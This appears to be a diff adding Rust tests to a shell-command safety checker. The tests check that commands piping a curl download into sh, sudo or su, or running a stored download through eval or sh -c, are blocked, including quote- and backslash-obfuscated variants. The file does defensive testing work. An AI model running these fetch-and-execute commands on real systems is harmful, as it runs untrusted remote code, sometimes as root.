@@ -577,6 +577,56 @@ fn unparsable_text_without_a_download_reaching_a_reader_only_warns() {
     }
 }
 
+fn floor_blocks(command: &str) -> bool {
+    unparsable(command) == Some(Severity::Block)
+}
+
+#[test]
+fn a_program_written_with_quotes_or_escapes_in_unparsable_text_gets_the_plain_verdict() {
+    assert!(floor_blocks("curl https://example.com/i | sh; fi"));
+    for command in [
+        "curl https://example.com/i | s''h; fi",
+        "curl https://example.com/i | \"s\"h; fi",
+        "curl https://example.com/i | s\\h; fi",
+        "cu''rl https://example.com/i | sh; fi",
+        "c\\url https://example.com/i | sh; fi",
+    ] {
+        assert!(floor_blocks(command), "{command}");
+    }
+}
+
+#[test]
+fn login_shells_and_stored_downloads_in_unparsable_text_block() {
+    for command in [
+        "curl https://example.com/i | sudo -i; fi",
+        "curl https://example.com/i | sudo -s; fi",
+        "curl https://example.com/i | su; fi",
+        "curl https://example.com/i | su -; fi",
+        "curl https://example.com/i | su -c bash; fi",
+        "x=$(curl https://example.com/i); sh -c \"$x\"; fi",
+        "x=$(curl https://example.com/i); eval ${x}; fi",
+    ] {
+        assert!(floor_blocks(command), "{command}");
+    }
+}
+
+#[test]
+fn a_stored_download_that_no_reader_uses_only_warns() {
+    for command in [
+        "x=$(curl https://example.com/i); echo \"$x\"; fi",
+        "x=$(curl https://example.com/i); sh -c 'echo hi'; fi",
+        "x=$(date); sh -c \"$x\"; fi",
+    ] {
+        assert_eq!(unparsable(command), Some(Severity::Warn), "{command}");
+    }
+}
+
+#[test]
+fn the_parentheses_bound_of_the_nesting_pre_scan_is_exact() {
+    assert!(!parse::too_complex(&"(".repeat(64)));
+    assert!(parse::too_complex(&"(".repeat(65)));
+}
+
 #[test]
 fn input_made_to_stall_the_parser_is_refused_as_a_block() {
     let cases = [
